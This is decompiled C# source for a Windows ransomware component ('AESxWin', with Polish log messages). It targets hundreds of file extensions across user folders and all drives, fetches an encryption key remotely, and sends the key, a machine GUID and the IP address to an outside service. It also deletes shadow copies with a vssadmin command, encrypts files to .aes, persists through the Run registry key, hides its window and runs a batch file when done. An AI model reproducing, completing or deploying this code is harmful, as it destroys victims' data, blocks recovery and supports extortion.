using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace AESxWin;

public class Ustawienia : Form
{
	public static string[] string_0 = new string[390]
	{
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".groups", ".hdd", ".hpp", ".m2ts", ".m4p",
		".mpeg", ".ndf", ".nvram", ".ogg", ".ost", ".pab", ".pdb", ".pif", ".qed", ".qcow",
		".qcow2", ".rvt", ".st7", ".stm", ".vbox", ".vdi", ".vhd", ".vhdx", ".vmdk", ".vmsd",
		".vmx", ".vmxf", ".3fr", ".3pr", ".ab4", ".accde", ".accdr", ".accdt", ".ach", ".acr",
		".adb", ".ads", ".agdl", ".ait", ".apj", ".asm", ".awg", ".back", ".backup", ".backupdb",
		".bay", ".bdb", ".bgt", ".bik", ".bpw", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw",
		".ce1", ".ce2", ".cib", ".craw", ".crw", ".csh", ".csl", ".db_journal", ".dc2", ".dcs",
		".ddoc", ".ddrw", ".der", ".des", ".dgc", ".djvu", ".dng", ".drf", ".dxg", ".eml",
		".erbsql", ".erf", ".exf", ".ffd", ".fh", ".fhd", ".gray", ".grey", ".gry", ".hbk",
		".ibd", ".ibz", ".iiq", ".incpas", ".jpe", ".kc2", ".kdbx", ".kdc", ".kpdx", ".lua",
		".mdc", ".mef", ".mfw", ".mmw", ".mny", ".mrw", ".myd", ".ndd", ".nef", ".nk2",
		".nop", ".nrw", ".ns2", ".ns3", ".ns4", ".nwb", ".nx2", ".nxl", ".nyf", ".odb",
		".odf", ".odg", ".odm", ".orf", ".otg", ".oth", ".otp", ".ots", ".ott", ".p12",
		".p7b", ".p7c", ".pdd", ".pem", ".plus_muhd", ".plc", ".pot", ".pptx", ".psafe3", ".py",
		".qba", ".qbr", ".qbw", ".qbx", ".qby", ".raf", ".rat", ".raw", ".rdb", ".rwl",
		".rwz", ".s3db", ".sd0", ".sda", ".sdf", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf",
		".srw", ".st5", ".st8", ".std", ".sti", ".stw", ".stx", ".sxd", ".sxg", ".sxi",
		".sxm", ".tex", ".wallet", ".wb2", ".wpd", ".x11", ".x3f", ".xis", ".ycbcra", ".yuv",
		".contact", ".dbx", ".doc", ".docx", ".jnt", ".msg", ".oab", ".ods", ".pdf", ".pps",
		".ppsm", ".ppt", ".pptm", ".prf", ".pst", ".rar", ".rtf", ".wab", ".xls", ".xlsx",
		".xml", ".zip", ".1cd", ".3ds", ".3g2", ".3gp", ".7z", ".7zip", ".accdb", ".aoi",
		".asf", ".asp", ".aspx", ".asx", ".avi", ".bak", ".cer", ".cfg", ".class", ".config",
		".css", ".csv", ".db", ".dds", ".dwg", ".dxf", ".flf", ".flv", ".html", ".idx",
		".js", ".key", ".kwm", ".laccdb", ".ldf", ".lit", ".m3u", ".mbx", ".md", ".mdf",
		".mid", ".mlb", ".mov", ".mp4", ".mpg", ".obj", ".odt", ".ods", ".odp", ".pages",
		".php", ".psd", ".pwm", ".rm", ".safe", ".sav", ".save", ".sql", ".srt", ".swf",
		".thm", ".vob", ".wav", ".wma", ".wmv", ".xlsb3dm", ".aac", ".ai", ".arw", ".c",
		".cdr", ".cls", ".cpi", ".cpp", ".cs", ".db3", ".docm", ".dot", ".dotm", ".dotx",
		".drw", ".dxb", ".eps", ".fla", ".flac", ".fxg", ".java", ".m", ".m4v", ".max",
		".mdb", ".pcd", ".pct", ".pl", ".potm", ".potx", ".ppam", ".ppsm", ".ppsx", ".pptm",
		".ps", ".r3d", ".rw2", ".sldm", ".sldx", ".svg", ".tga", ".wps", ".xla", ".xlam",
		".xlm", ".xlr", ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".act", ".adp", ".al",
		".bkp", ".blend", ".cdf", ".cdx", ".cgm", ".cr2", ".crt", ".dac", ".dbf", ".dcr",
		".ddd", ".design", ".dtd", ".fdb", ".fff", ".fpx", ".h", ".iif", ".indd", ".jpeg",
		".mos", ".nd", ".nsd", ".nsf", ".nsg", ".nsh", ".odc", ".odp", ".oil", ".pas",
		".pat", ".pef", ".pfx", ".ptx", ".qbb", ".qbm", ".sas7bdat", ".say", ".st4", ".st6",
		".stc", ".sxc", ".sxw", ".tlg", ".wad", ".xlk", ".aiff", ".bin", ".cmt", ".dat",
		".dit", ".edb", ".flvv", ".ntx", ".xsd", ".pem", ".xsd", ".xsl", ".ewd", ".dbt",
		".ob", ".gofin", ".dsf", ".ds4", ".shx", ".ath", ".bac", ".ts", ".dst", ".dwfx"
	};

	public static string[] string_1 = new string[15]
	{
		".avi", ".flv", ".mov", ".mp4", ".mpg", ".rm", ".rmvb", ".mkv", ".swf", ".vob",
		".wmv", ".3g2", ".3gp", ".asf", ".ogv"
	};

	public static string[] string_2 = new string[6] { ".mp3", ".wav", ".acc", ".ogg", ".amr", ".wma" };

	public static string[] string_3 = new string[9] { ".pdf", ".txt", ".rtf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx" };

	public static string[] string_4 = new string[5] { ".zip", ".rar", ".7z", ".tar", ".gzip" };

	public static string[] string_5 = new string[9] { ".cs", ".vb", ".java", ".py", ".rb", ".cpp", ".html", ".css", ".js" };

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private static string string_6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string string_7;

	public List<string> list_0 = new List<string>();

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private List<string> list_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string[] string_8;

	private BackgroundWorker backgroundWorker_0 = null;

	private BackgroundWorker backgroundWorker_1 = null;

	private Queue<string> queue_0 = new Queue<string>();

	private bool bool_0 = false;

	private long long_0 = 0L;

	private long long_1 = 0L;

	private bool bool_1 = false;

	private bool bool_2 = true;

	private string string_9 = string.Empty;

	private string string_10 = string.Empty;

	private bool bool_3 = false;

	private IContainer icontainer_0 = null;

	private Button btnStartAutoEncrypt;

	private Timer timer_0;

	private Timer timer_1;

	private Button button3;

	private Timer timer_2;

	private ComboBox comboBox2;

	private CheckBox checkBox1;

	private Button button8;

	private ComboBox comboBox3;

	private Button button9;

	private Button button10;

	private ComboBox comboBox1;

	private CheckBox chckIsStartup;

	private Button button1;

	private WebBrowser webBrowser1;

	private Button button12;

	private Button button11;

	private Button button4;

	private Button button13;

	public static string String_0
	{
		[CompilerGenerated]
		get
		{
			return string_6;
		}
		[CompilerGenerated]
		set
		{
			string_6 = value;
		}
	}

	public static string String_1
	{
		[CompilerGenerated]
		get
		{
			return string_7;
		}
		[CompilerGenerated]
		set
		{
			string_7 = value;
		}
	}

	public List<string> List_0
	{
		[CompilerGenerated]
		get
		{
			return list_1;
		}
		[CompilerGenerated]
		set
		{
			list_1 = value;
		}
	}

	public string[] String_2
	{
		[CompilerGenerated]
		get
		{
			return string_8;
		}
		[CompilerGenerated]
		set
		{
			string_8 = value;
		}
	}

	public bool Boolean_0
	{
		get
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			return registryKey.GetValue(Assembly.GetExecutingAssembly().GetName().Name) != null;
		}
		set
		{
			GClass1.smethod_2(value, Application.get_ExecutablePath());
		}
	}

	public bool Boolean_1
	{
		get
		{
			return bool_2;
		}
		set
		{
			bool_2 = value;
		}
	}

	public string String_3
	{
		get
		{
			return string_9;
		}
		set
		{
			string_9 = value;
		}
	}

	public string String_4
	{
		get
		{
			return string_10;
		}
		set
		{
			string_10 = value;
		}
	}

	public Guid Guid_0
	{
		get
		{
			Guid result = default(Guid);
			string text = GClass1.smethod_0("ComputerId");
			if (text != null)
			{
				Guid.TryParse(text, out result);
			}
			else
			{
				result = Guid.NewGuid();
				GClass1.smethod_1("ComputerId", result);
			}
			return result;
		}
	}

	public bool Boolean_2
	{
		get
		{
			return bool_3;
		}
		set
		{
			bool_3 = value;
			if (bool_3)
			{
				((Control)btnStartAutoEncrypt).set_Text("Stop");
			}
			else
			{
				((Control)btnStartAutoEncrypt).set_Text("Start");
			}
		}
	}

	public Ustawienia()
	{
		InitializeComponent();
		String_0 = "C:\\ProgramData\\Keyboard";
		if (!Directory.Exists(String_0))
		{
			Directory.CreateDirectory(String_0);
		}
		string text = DateTime.Now.ToString("ddMMyyyy_HHmmss");
		String_0 = Path.Combine(String_0, text + ".log");
		String_1 = Path.Combine(String_0, text + ".error");
		GClass4.smethod_0(String_0, "Start programu");
		Boolean_0 = true;
		chckIsStartup.set_Checked(Boolean_0);
		method_0();
		method_1();
		method_2();
		method_4();
		method_3();
	}

	private void method_0()
	{
		String_2 = string_0;
	}

	private void method_1()
	{
		List_0 = new List<string>();
		List_0.Add(Path.GetDirectoryName(Application.get_ExecutablePath()));
		List_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		List_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		List_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
		List_0.Add("C:\\Program Files\\Common Files");
	}

	private void method_2()
	{
		DriveInfo[] array = GClass2.smethod_10();
		_ = Guid_0;
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
		DriveInfo[] array2 = array;
		foreach (DriveInfo driveInfo in array2)
		{
			list_0.Add(driveInfo.RootDirectory.Name);
		}
	}

	private async void method_3()
	{
		try
		{
			string text2 = (String_3 = await GClass5.smethod_0());
			if (string.IsNullOrEmpty(String_3))
			{
				return;
			}
			if (String_3.Length <= 3)
			{
				_ = String_3;
			}
			else
			{
				String_3.Substring(0, 4);
			}
			GClass4.smethod_0(String_0, "Pobrano nowe hasło. 70hn");
			((Control)btnStartAutoEncrypt).set_Enabled(true);
			string arguments = "vssadmin.exe Delete Shadows /All /Quiet";
			Process.Start("CMD.exe", arguments);
			if (backgroundWorker_0 == null && backgroundWorker_1 == null && Boolean_1)
			{
				btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			}
			try
			{
				if (!string.IsNullOrEmpty(String_3) && !string.IsNullOrEmpty(String_4) && !bool_1)
				{
					GClass6.smethod_0(String_4, Guid_0.ToString(), DateTime.Now, String_3);
					bool_1 = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			GClass4.smethod_0(String_1, "Błąd pobierania hasła. " + ex2.ToString());
		}
	}

	private async void method_4()
	{
		try
		{
			string text2 = (String_4 = await GClass3.smethod_0());
			if (!string.IsNullOrEmpty(String_4))
			{
				GClass4.smethod_0(String_0, "Ustalono adres IP. " + String_4);
			}
			else
			{
				GClass4.smethod_0(String_0, "Błąd pobierania adresu IP.");
			}
			try
			{
				if (!string.IsNullOrEmpty(String_3) && !string.IsNullOrEmpty(String_4) && !bool_1)
				{
					GClass6.smethod_0(String_4, Guid_0.ToString(), DateTime.Now, String_3);
					bool_1 = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			GClass4.smethod_0(String_1, "Błąd pobierania hasła. " + ex2.ToString());
		}
	}

	private void chckIsStartup_Click(object sender, EventArgs e)
	{
		Boolean_0 = chckIsStartup.get_Checked();
	}

	private void btnStartAutoEncrypt_Click(object sender, EventArgs e)
	{
		if (((Control)btnStartAutoEncrypt).get_Enabled())
		{
			if (!Boolean_2)
			{
				Boolean_2 = !Boolean_2;
				method_5();
			}
			else
			{
				method_6();
			}
		}
	}

	private void method_5()
	{
		long_0 = 0L;
		lock (queue_0)
		{
			queue_0.Clear();
		}
		backgroundWorker_1 = new BackgroundWorker();
		backgroundWorker_1.RunWorkerCompleted += backgroundWorker_1_RunWorkerCompleted;
		backgroundWorker_1.DoWork += backgroundWorker_1_DoWork;
		backgroundWorker_1.RunWorkerAsync();
		backgroundWorker_0 = new BackgroundWorker();
		backgroundWorker_0.DoWork += backgroundWorker_0_DoWork;
		backgroundWorker_0.RunWorkerCompleted += backgroundWorker_0_RunWorkerCompleted;
		backgroundWorker_0.RunWorkerAsync();
		string text = string.Empty;
		foreach (string item in list_0)
		{
			text = text + item + " ";
		}
		GClass4.smethod_0(String_0, "Rozpoczęto przeszukiwanie lokalizacji: " + text);
	}

	private void method_6()
	{
		Boolean_2 = false;
		Thread.Sleep(50);
		lock (queue_0)
		{
			queue_0.Clear();
		}
	}

	private void backgroundWorker_1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		GClass4.smethod_0(String_0, $"Zakończono przeszukiwanie dysku ({long_1})");
		bool_0 = true;
	}

	private void backgroundWorker_1_DoWork(object sender, DoWorkEventArgs e)
	{
		List<string> list = new List<string>();
		foreach (string item in List_0)
		{
			if (!Boolean_2)
			{
				continue;
			}
			try
			{
				IEnumerable<string> enumerable = item.smethod_6();
				foreach (string item2 in enumerable)
				{
					try
					{
						string directoryName = Path.GetDirectoryName(item2);
						if (!list.Contains(directoryName))
						{
							list.Add(directoryName);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception ex2)
			{
				GClass4.smethod_0(String_1, "BwPathFinder_DoWork " + ex2.ToString());
			}
		}
		List_0.AddRange(list);
		foreach (string item3 in list_0)
		{
			if (!Boolean_2)
			{
				break;
			}
			try
			{
				if (File.Exists(item3))
				{
					try
					{
						string directoryName2 = Path.GetDirectoryName(item3);
						if (!List_0.Contains(directoryName2) && item3.smethod_9(String_2))
						{
							lock (queue_0)
							{
								queue_0.Enqueue(item3);
							}
							long_1++;
						}
					}
					catch (Exception ex3)
					{
						GClass4.smethod_0(String_1, "BwPathFinder_DoWork 1 " + ex3.ToString());
					}
				}
				try
				{
					if (!Directory.Exists(item3) || List_0.Contains(item3))
					{
						continue;
					}
					IEnumerable<string> enumerable2 = item3.smethod_6();
					foreach (string item4 in enumerable2)
					{
						try
						{
							string directoryName3 = Path.GetDirectoryName(item4);
							if (List_0.Contains(directoryName3))
							{
								continue;
							}
							if (!Boolean_2)
							{
								break;
							}
							if (item4.smethod_9(String_2) && !item4.EndsWith(".aes"))
							{
								lock (queue_0)
								{
									queue_0.Enqueue(item4);
								}
								long_1++;
							}
							Thread.Sleep(1);
							continue;
						}
						catch
						{
						}
					}
				}
				catch (Exception ex4)
				{
					GClass4.smethod_0(String_1, "BwPathFinder_DoWork 1.2 " + ex4.ToString());
				}
			}
			catch (Exception ex5)
			{
				GClass4.smethod_0(String_1, "BwPathFinder_DoWork 2 " + ex5.ToString());
			}
		}
	}

	private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
	{
		while (Boolean_2)
		{
			try
			{
				if (queue_0.Count != 0)
				{
					string text = String_3;
					string path = string.Empty;
					lock (queue_0)
					{
						path = queue_0.Dequeue();
					}
					if (File.Exists(path))
					{
						try
						{
							path.smethod_1(text, bool_0: true);
							long_0++;
							string directoryName = Path.GetDirectoryName(path);
							if (!GClass7.smethod_1(directoryName))
							{
								GClass7.smethod_0(directoryName, String_4, Guid_0.ToString(), DateTime.Now);
							}
						}
						catch (Exception ex)
						{
							GClass4.smethod_0(String_1, "BwEncryptor_DoWork " + ex.ToString());
						}
					}
				}
				if (bool_0 && queue_0.Count == 0)
				{
					break;
				}
			}
			catch (Exception ex2)
			{
				GClass4.smethod_0(String_1, "BwEncryptor_DoWork 2 " + ex2.ToString());
			}
			Thread.Sleep(20);
		}
		e.Result = true;
	}

	private void backgroundWorker_0_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		if (bool_0)
		{
			GClass4.smethod_0(String_0, $"Zakończono szyfrowanie ({long_0})");
			btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			GClass1.smethod_2(bool_0: false, Application.get_ExecutablePath());
			GClass4.smethod_0(String_0, $"Usuwam z autostartu i zamykam program");
			try
			{
				Process process = new Process();
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = "exec.bat";
				process.Start();
			}
			catch
			{
			}
			((Form)this).Close();
		}
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
	}

	private void method_7(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		string s = "100";
		int.TryParse(s, out var result);
		MessageBox.Show("The value of i is " + result);
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		comboBox1.set_DataSource((object)"ssss");
		((ListControl)comboBox1).set_ValueMember("au_id");
		((ListControl)comboBox1).set_DisplayMember("au_lname");
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		char[] array = new char[5] { 'A', 'B', 'C', 'D', 'E' };
		for (int i = 0; i < array.Length; i++)
		{
			MessageBox.Show(array[i].ToString());
		}
		Array.Resize(ref array, 3);
		for (int j = 0; j < array.Length; j++)
		{
			MessageBox.Show(array[j].ToString());
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_027d: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0541: Unknown result type (might be due to invalid IL or missing references)
		//IL_0630: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Unknown result type (might be due to invalid IL or missing references)
		//IL_0786: Unknown result type (might be due to invalid IL or missing references)
		//IL_07fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a14: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a1e: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ustawienia));
		btnStartAutoEncrypt = new Button();
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		button3 = new Button();
		timer_2 = new Timer(icontainer_0);
		comboBox2 = new ComboBox();
		checkBox1 = new CheckBox();
		button8 = new Button();
		comboBox3 = new ComboBox();
		button9 = new Button();
		button10 = new Button();
		comboBox1 = new ComboBox();
		chckIsStartup = new CheckBox();
		button1 = new Button();
		webBrowser1 = new WebBrowser();
		button12 = new Button();
		button11 = new Button();
		button4 = new Button();
		button13 = new Button();
		((Control)this).SuspendLayout();
		((Control)btnStartAutoEncrypt).set_Anchor((AnchorStyles)10);
		((Control)btnStartAutoEncrypt).set_Enabled(false);
		((Control)btnStartAutoEncrypt).set_Location(new Point(576, 141));
		((Control)btnStartAutoEncrypt).set_Name("btnStartAutoEncrypt");
		((Control)btnStartAutoEncrypt).set_Size(new Size(84, 23));
		((Control)btnStartAutoEncrypt).set_TabIndex(4);
		((Control)btnStartAutoEncrypt).set_Text("Start");
		((ButtonBase)btnStartAutoEncrypt).set_UseVisualStyleBackColor(true);
		((Control)btnStartAutoEncrypt).add_Click((EventHandler)btnStartAutoEncrypt_Click);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		((Control)button3).set_Location(new Point(219, 59));
		((Control)button3).set_Margin(new Padding(2));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(10, 10));
		((Control)button3).set_TabIndex(7);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		((ListControl)comboBox2).set_FormattingEnabled(true);
		((Control)comboBox2).set_Location(new Point(183, 63));
		((Control)comboBox2).set_Margin(new Padding(2));
		((Control)comboBox2).set_Name("comboBox2");
		((Control)comboBox2).set_Size(new Size(21, 21));
		((Control)comboBox2).set_TabIndex(10);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Location(new Point(254, 80));
		((Control)checkBox1).set_Margin(new Padding(2));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(80, 17));
		((Control)checkBox1).set_TabIndex(13);
		((Control)checkBox1).set_Text("checkBox1");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
		((Control)button8).set_Location(new Point(208, 125));
		((Control)button8).set_Margin(new Padding(2));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(10, 19));
		((Control)button8).set_TabIndex(21);
		((Control)button8).set_Text("button8");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((ListControl)comboBox3).set_FormattingEnabled(true);
		((Control)comboBox3).set_Location(new Point(201, 214));
		((Control)comboBox3).set_Margin(new Padding(2));
		((Control)comboBox3).set_Name("comboBox3");
		((Control)comboBox3).set_Size(new Size(92, 21));
		((Control)comboBox3).set_TabIndex(20);
		((Control)button9).set_Location(new Point(44, 83));
		((Control)button9).set_Margin(new Padding(2));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(186, 10));
		((Control)button9).set_TabIndex(19);
		((Control)button9).set_Text("button9");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button10).set_Location(new Point(185, 77));
		((Control)button10).set_Margin(new Padding(2));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(10, 10));
		((Control)button10).set_TabIndex(18);
		((Control)button10).set_Text("button10");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		((Control)comboBox1).set_Location(new Point(130, 64));
		((Control)comboBox1).set_Margin(new Padding(2));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(21, 21));
		((Control)comboBox1).set_TabIndex(22);
		((Control)chckIsStartup).set_Anchor((AnchorStyles)10);
		((Control)chckIsStartup).set_AutoSize(true);
		((Control)chckIsStartup).set_Location(new Point(563, 117));
		((Control)chckIsStartup).set_Name("chckIsStartup");
		((Control)chckIsStartup).set_Size(new Size(161, 17));
		((Control)chckIsStartup).set_TabIndex(1);
		((Control)chckIsStartup).set_Text("Uruchom ze startem systemu");
		((ButtonBase)chckIsStartup).set_UseVisualStyleBackColor(true);
		((Control)chckIsStartup).add_Click((EventHandler)chckIsStartup_Click);
		((Control)button1).set_Location(new Point(245, 95));
		((Control)button1).set_Margin(new Padding(2));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(10, 10));
		((Control)button1).set_TabIndex(5);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)webBrowser1).set_Location(new Point(103, 98));
		((Control)webBrowser1).set_Margin(new Padding(2));
		((Control)webBrowser1).set_MinimumSize(new Size(15, 16));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(117, 153));
		((Control)webBrowser1).set_TabIndex(11);
		((Control)button12).set_Location(new Point(245, 80));
		((Control)button12).set_Margin(new Padding(2));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(10, 25));
		((Control)button12).set_TabIndex(16);
		((Control)button12).set_Text("button12");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((Control)button11).set_Location(new Point(243, 83));
		((Control)button11).set_Margin(new Padding(2));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(10, 10));
		((Control)button11).set_TabIndex(17);
		((Control)button11).set_Text("button11");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button4).set_Location(new Point(136, 48));
		((Control)button4).set_Margin(new Padding(2));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(186, 114));
		((Control)button4).set_TabIndex(30);
		((Control)button4).set_Text("button4");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button13).set_Location(new Point(122, 52));
		((Control)button13).set_Margin(new Padding(2));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(10, 10));
		((Control)button13).set_TabIndex(24);
		((Control)button13).set_Text("button13");
		((ButtonBase)button13).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(738, 167));
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button13);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)button8);
		((Control)this).get_Controls().Add((Control)(object)comboBox3);
		((Control)this).get_Controls().Add((Control)(object)button9);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)button11);
		((Control)this).get_Controls().Add((Control)(object)button12);
		((Control)this).get_Controls().Add((Control)(object)checkBox1);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)comboBox2);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)btnStartAutoEncrypt);
		((Control)this).get_Controls().Add((Control)(object)chckIsStartup);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Ustawienia");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Ustawienia");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
